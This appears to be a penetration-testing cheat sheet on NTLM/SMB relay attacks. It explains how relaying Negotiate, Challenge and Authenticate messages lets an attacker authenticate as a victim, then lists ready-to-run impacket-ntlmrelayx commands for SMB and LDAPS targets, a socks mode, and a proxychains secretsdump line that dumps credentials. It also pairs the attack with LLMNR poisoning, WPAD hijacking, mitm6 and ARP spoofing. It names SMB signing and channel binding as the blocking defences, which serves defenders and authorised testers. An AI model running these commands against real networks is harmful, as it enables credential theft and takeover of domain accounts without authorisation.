# NTLM / SMB relay

## The main Idea behind "Relay" is that we don't crack anything. NTLM is a challenge-response - the victim proves it knows the password, without sending it. So we just decide to forward the whole communication to a different server and let it accept the auth. So the target just "makes us" the Victim

#### 445 TCP (SMB) - also works over HTTP/LDAP/MSSQL

NTLM on its own has 3 messages - `Negotiate - Challenge - Authenticate`.
The victim doesn't sign anything that's tied to `who` it's talking to (unless signing/EAP is on). So we just relay each message onto the second server and so we get a valid answer from the Victim to the server

## So how it all works

1. Victim connects to us and starts NTLM (SMB connect + Negotiate)
2. We relay the `Negotiate` to the server
3. The server sends us the `Challenge`
4. We relay it to the Victim
5. Victim sends us calculated `Authenticate` after the challenge
6. We relay it to the server
7. The server just auth's us as this Victim

<img width="1000" height="700" alt="ntlm-smb-relay" src="https://github.com/user-attachments/assets/4eaaa459-be72-4985-8def-30f072311c90" />

## Commands

### Attention - if you're using `Responder` don't forget to free ports 445 and 80
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support

# We can relay to AD as well
sudo impacket-ntlmrelayx -t ldaps://dc1 --delegate-access

# socks keeps the session alive, instead of firing it
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Finally the proxychain to extract data
proxychains secretsdump.py victim@10.0.0.5
```


## May be combined with
- LLMNR / NBT-NS Poison - (the usual way to make a victim auth to us)
- WPAD Hijacking - (the 407-captured HTTP auth, relayed on)
- mitm6 / IPv6 DNS Takeover - (DHCPv6 + rogue DNS to trigger it)
- ARP Spoofing / MITM - (drop ourselves into the path first)

## Gotchas
- Target enforcing **SMB signing** = relay dies. This is the #1 fix and the #1 thing to check first.
- **EPA / channel binding** kills HTTP -> LDAPS relay even without signing.
- Can't relay a host back to itself - reflection died with MS08-068, `targets.txt` must point elsewhere.
- `targets.txt` - one per line: `smb://10.0.0.5`, `ldap://dc01`, `mssql://...`
- The relayed account still needs rights on the target to matter (local admin for a SAM dump, write access for ACL abuse, etc.)

